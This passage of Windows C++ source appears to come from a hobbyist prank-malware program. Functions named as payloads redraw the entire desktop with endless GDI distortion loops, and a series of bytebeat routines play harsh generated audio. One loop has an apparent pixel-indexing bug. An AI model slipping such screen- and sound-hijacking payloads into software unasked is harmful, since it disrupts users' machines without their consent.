		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				float fx = (tan(x / 30.f) * 150 + ceil(i * 10)) * fabs(cbrt(y / 45.f) * 200 + (i * 10));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				hslcolor.s = 1.f;
				hslcolor.l += 0.1f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}
	SelectObject(hdcCopy, bmpcopy);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload17_num2(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0) / 4, h = GetSystemMetrics(1) / 4, w1 = w * 4, h1 = h * 4;
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w1, h1);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w1, h1, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, -10, -10, w, h, hdcCopy, 0, 0, SRCCOPY);
		BitBlt(hdc, w + 10, 0, w, h - 10, hdcCopy, w, 0, SRCCOPY);
		BitBlt(hdc, w * 2 - 10, 0, w - 10, h, hdcCopy, w * 2, 0, SRCCOPY);
		BitBlt(hdc, w * 3 + 10, -10, w, h, hdcCopy, w * 3, 0, SRCCOPY);
		BitBlt(hdc, 0, h + 10, w, h - 10, hdcCopy, 0, h, SRCCOPY);
		StretchBlt(hdc, w, h, w, h, hdcCopy, 0, 0, w1, h1, SRCCOPY);
		BitBlt(hdc, w * 2 + 10, h + 10, w - 10, h - 10, hdcCopy, w * 2, h, SRCCOPY);
		BitBlt(hdc, w * 3 + 10, h, w - 10, h, hdcCopy, w * 3, h, SRCCOPY);
		StretchBlt(hdc, 0, h * 2, w, h, hdcCopy, 0, 0, w1, h1, SRCCOPY);
		StretchBlt(hdc, w, h * 2, w, h, hdcCopy, w + 10, h * 2 + 10, w - 20, h - 20, SRCCOPY);
		StretchBlt(hdc, w * 2 + 10, h * 2 + 10, w - 20, h - 20, hdcCopy, w * 2, h * 2, w, h, SRCCOPY);
		StretchBlt(hdc, w * 3, h * 2, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		BitBlt(hdc, 10, h * 3, w - 10, h, hdcCopy, 0, h * 3, SRCCOPY);
		BitBlt(hdc, w, h * 3 + 10, w, h, hdcCopy, w, h * 3, SRCCOPY);
		BitBlt(hdc, w * 2, h * 3 + 10, w, h, hdcCopy, w * 2, h * 3, SRCCOPY);
		BitBlt(hdc, w * 3 + 10, h * 3 + 10, w, h, hdcCopy, w * 3, h * 3, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	SelectObject(hdcCopy, bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload18_num1(LPVOID lparam) {//again! NO USING AI!
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0, xxx = 0, power = 75; double angle = 0.f, cix = 0, ciy = 0, size = 450 + ((1 + rand() % 14) * 100), ccciii = size;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; y++) { StretchBlt(hdcCopy, -4 + rand() % 9, y, w, 1, hdcCopy, 0, y, w, 1, SRCCOPY); }
		int x = power * cos(angle * PI / 30), y = power * sin(angle * PI / 30);
		StretchBlt(hdcCopy, x / 2, y / 2, w - x, h - y, hdcCopy, 0, 0, w, h, SRCCOPY);
		BitBlt(hdcCopy, rand() % 25, rand() % 25, w, h, hdcCopy, rand() % 25, rand() % 25, SRCAND);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int xy = log10(x + y) ? (x & y) : (y % (x + 3));
				int fx = (x / 2) ^ (2 - x) >> xy;
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		for (int kun = 0; kun < 2; kun++) {
			int rand_num_x = rand() % w, rand_num_y = rand() % h;
			int top_x = 0 + rand_num_x, top_y = 0 + rand_num_y;
			int bottom_x = 180 + rand_num_x, bottom_y = 180 + rand_num_y;
			HRGN circle = CreateEllipticRgn(top_x, top_y, bottom_x, bottom_y);
			SelectClipRgn(hdcCopy, circle);
			HBRUSH hBrush = CreateSolidBrush(RndRGB);
			SelectObject(hdcCopy, hBrush);
			BitBlt(hdcCopy, rand_num_x, rand_num_y, w, h, hdcCopy, rand_num_x, rand_num_y, PATINVERT);
			DeleteObject(circle); DeleteObject(hBrush);
		}
		if (ccciii > size) {
			size = 450 + ((1 + rand() % 14) * 100);
			cix = rand() % (int)(w + size) - (size / 2);
			ciy = rand() % (int)(h + size) - size / 2;
			ccciii = 0;
		}
		else { ccciii += 150; }
		CircleFunction(hdcCopy, cix - ccciii / 2, ciy - ccciii / 2, ccciii, ccciii);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmpcopy);
		if (angle > 361) { angle = 0; }
		else { angle += 3.1415926 / 2; }
		Sleep(1); i++; xxx += 5;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload19_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 }; bmpi.bmiHeader = { sizeof(bmpi), w, h, 1, 32, BI_RGB };
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	while (true) {
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCAND);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * x + w;
				int fx = (int)((11 ^ i) + fabs((11 - i) * sqrt(x - 15)) + (9 * i) + ((6 * i) * tan(y + 44)));
				rgbquad[index].rgbRed += fx >> i;
				rgbquad[index].rgbGreen += fx ^ i;
				rgbquad[index].rgbBlue -= fx | i;
			}
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCERASE);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmpcopy);
		i++;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
VOID WINAPI bytebeat1() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((int(tan(log(cos(t * ((t >> 5) * 14 & 11) / 99))))) | 0) * (t - random())));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat2() {//by UltraDasher965, but i modified it with random()
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t | t >> 10) * (t & t >> 4 & t >> 8) * ((t * random()) / 66)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat3() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((int(tan(t * (log(t >> 5 | t >> 9) * 36)) * 114) | 0));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat4() {//by UltraDasher965
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t & t + t / 256) - t * (t & t >> 10) & 127) * 2);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat5() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((log10(t * 0.1) + tan(t * 1.001)) * cos(t * 0.101)) * (t >> 9));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat6() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((sin(t >> (t >> 13 & 7 | t >> 8) & (t >> 13 & 7 | t >> 8)) * 91));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat7() {//credits to UltraDasher965, but i modified it
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan(t * (0x1145147891 >> (t >> 9 & 30) & 55) + t) * (t >> 8));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat8() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan((t << 6) & ((9 * t * (t % 20)) >> 7)) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat9() {//by UltraDasher965
	int nSamplesPerSec = 44100, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t / (1 + (t >> 14 & t))) * t) >> 17));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat10() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t >> 11 >> (t & t >> 4)) * (t >> 5 >> (t & t >> 14) & 128 ? -1 : 1) + (t >> t / (t & 65536 ? 2 : 3) & 63) + (30000 / ((t & 4095) + 1) & 100));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat11() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t & 50) * (((t >> 3) & 3) + 5) * ((((t * (50 / 33)) >> 10) & 5) + 3)) >> ((t >> 4) & 3));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat12() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t >> 9 & 1 + t >> 10 & 0 ? 0 : 10000 / (1 + (t % 8192)) - t / 18 & 8 ? -1 : 0) ^ t >> 5 & ((t * t / ((t % 5033) + 50) | t >> 2) * (t >> 12) >> 4));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat13() {//credits to N17Pro3426, but i modified it a lot
	int nSamplesPerSec = 44100, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((((t & 114 / (t & t >> 51 ? t & t >> 14 ? 5 : 1 : 4)) + (t / "20240630"[(t >> 13) % 8] & 64) + (int(sqrt(4E3 * (t & 16383))) & 64) + (t * (t & t >> 11) & 45)) | 14 + t)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat14() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t % 11 - (t >> 4 | 51 * t | t % 114) - t >> 5 | (t > 14 & 1919 * (t << 8) | (t >> 3) % 1544) * (t % 17 | t % 2048)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat15() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(int(128 * sin((t / ((t & t >> 12) + 1))) + 128) & 199);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat16() {//by UltraDasher965
	int nSamplesPerSec = 44100, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t >> 2 | ((t & t >> 10 & 235) - (t >> 10))) - 15) * 51);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat17() {//by UltraDasher965
	int nSamplesPerSec = 32000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t >> 9 ^ (t >> 9) - (t >> 11) ^ 1) % 13 * t) & 128);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
